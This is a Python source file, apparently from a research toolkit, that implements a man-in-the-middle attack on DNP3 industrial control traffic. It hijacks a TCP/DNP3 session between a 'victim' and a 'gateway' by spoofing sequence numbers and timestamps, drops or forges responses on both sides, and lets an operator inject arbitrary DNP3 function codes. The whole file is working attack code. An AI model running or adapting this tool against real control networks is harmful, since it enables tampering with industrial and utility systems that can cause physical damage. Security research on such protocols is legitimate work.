__author__ = 'Nicholas Rodofile'

from DNP3_MITM import *
from MITM_Lib import *

class DNP3_Injection(DNP3_MITM, Injection):
    def __init__(self, victim=None, gateway=None, verbose=1,
                 pkt_count=1, interface_selected=None):

        DNP3_MITM.__init__(self, victim=victim, gateway=gateway, verbose=verbose,
                           pkt_count=pkt_count, interface_selected=interface_selected)

        Injection.__init__(self, victim=victim, gateway=gateway, verbose=verbose,
                           pkt_count=pkt_count, interface_selected=interface_selected)
        self.conditional_forwarding = False

    def injector(self):
        spoofer = self.gateway.spoofer
        while self.gateway.sequence <= 0 or self.victim.sequence <= 0:
            # wait for sequence numbers
            pass
        while self.gateway.DNP3_address is None or self.victim.DNP3_address is None:
            # wait for sequence numbers
            pass
        print "TCP and DNP3 Connection is now Compromised"
        while not self.hijacked:
            hijacked_input = str(raw_input("Enter \'h\' to Hijack connection\n"))
            if hijacked_input == "h":
                con_forwarding_option = False
                while not con_forwarding_option:
                    forward_option = str(raw_input("Enter \'y\' for forwarding conditions\n"))
                    if forward_option == "y" or forward_option == "Y":
                        self.conditional_forwarding = True
                        con_forwarding_option = True
                    if forward_option == "n" or forward_option == "N":
                        self.conditional_forwarding = False
                        con_forwarding_option = True
                self.hijacked = True

        self.victim.spoofer.dnp3_spoof_sequence = self.gateway.DNP3_sequence
        self.gateway.spoofer.dnp3_spoof_sequence = self.victim.DNP3_sequence
        self.victim.spoofer.dnp3_app_sequence = self.gateway.DNP3_app_sequence
        self.gateway.spoofer.dnp3_app_sequence = self.victim.DNP3_app_sequence
        self.gateway.spoofer.timestamp = self.victim.timestamp
        self.victim.spoofer.timestamp = self.victim.timestamp
        self.gateway.spoofer.timestamp_ecr = self.victim.timestamp_echo_response
        self.victim.spoofer.timestamp_ecr = self.gateway.timestamp_echo_response
        self.gateway.spoofer.start_time = time.time()
        self.victim.spoofer.start_time = time.time()
        self.gateway.spoofer.sequence = self.victim.acknowledgement
        self.gateway.spoofer.acknowledgement = self.victim.sequence
        self.gateway.spoofer.window_size = self.victim.window_size
        self.victim.spoofer.window_size = self.gateway.window_size
        print "Connection is now hijacked, listening for Injection"
        print "Victim DNP3 Seq", self.victim.spoofer.dnp3_spoof_sequence
        print "Gateway DNP3 Seq", self.gateway.spoofer.dnp3_spoof_sequence
        print self.gateway.show_all()
        print self.gateway.spoofer.show_all()
        print self.victim.show_all()
        print self.victim.spoofer.show_all()

        ReadFunction = 1
        while self.attacking:
            inject = str(raw_input("Inject by DNP3 Function Code\n"))
            if inject == "":
                spoofer.inject(ReadFunction)
            else:
                if inject.isdigit():
                    spoofer.inject(inject)
                else:
                    print "Needs to be a DNP3 Function Code!"

    def forward_Spoof(self, pkt):
        if pkt.haslayer(Ether):
            if pkt[Ether].dst == self.attacker.mac_address:
                if pkt[Ether].src == self.gateway.mac_address:
                    self.gateway.spoofer.forward(pkt)

                elif pkt[Ether].src == self.victim.mac_address:
                    self.victim.spoofer.forward(pkt)

                else:
                    self.error("Forward Error!: ", pkt.summary())
                    return
        return

    def forwarding_condition(self, pkt):
        if pkt.haslayer(DNP3ApplicationResponse):
            if pkt[DNP3ApplicationResponse].FUNC_CODE == 130:  #Unsolicited Response
                return True

    def process_packet(self, pkt):
        if self.hijacked is True:
            if pkt.haslayer(Ether):
                if self.conditional_forwarding:
                    if self.forwarding_condition(pkt):
                        fwd_pkt = copy.deepcopy(pkt)
                        self.forward_Spoof(fwd_pkt)
                if pkt.haslayer(TCP):
                    if pkt[Ether].dst == self.attacker.mac_address:
                        if pkt[Ether].src == self.gateway.mac_address:
                            if pkt[TCP].flags == 24:
                                self.victim.spoofer.gateway_responder(pkt)
                                return
                            if self.verbose:
                                print "DROPPING >> ", pkt.summary()
                            self.victim.spoofer.sequence_conf(pkt)
                            return
                        elif pkt[Ether].src == self.victim.mac_address:
                            if pkt[TCP].flags == 24:
                                self.gateway.spoofer.victim_responder(pkt)
                                return
                            if self.verbose:
                                print "DROPPING >> ", pkt.summary()
                            self.gateway.spoofer.sequence_conf(pkt)
                            return
                        else:
                            self.error("Forward Error!: ", pkt.summary())
                            return
        else:
            self.forward_packet(pkt)

def DNP3_Injection_conf(interface='eth0', verbose=1, pkt_count=50):
    gateway, victim = config_nodes(interface=interface, init_nodes_func=init_dnp3_nodes, port="20000")
    return DNP3_Injection(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)